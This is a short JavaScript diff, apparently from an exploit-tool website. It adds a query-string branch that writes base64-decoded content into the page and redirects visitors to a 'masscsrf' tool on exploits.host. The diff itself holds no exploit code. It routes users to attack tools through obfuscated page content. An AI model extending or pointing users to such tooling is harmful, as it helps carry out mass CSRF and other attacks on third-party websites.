@@ -385,6 +385,10 @@
     document.title = "[+] Grab New Domain [+]";
     document.write(atob(sc));
     delay("http://v1.exploits.host/?tools=grabnew");
+}  else if (window.location.search.indexOf('massrf') > -1) {
+    document.title = "[+] Grab New Domain [+]";
+    document.write(atob(sc));
+    delay("http://v1.exploits.host/?tools=masscsrf");
 }  else if (window.location.search.indexOf('mirror') > -1) {
     document.title = "[+] Auto Mirror [+]";
     document.write(atob(sc));
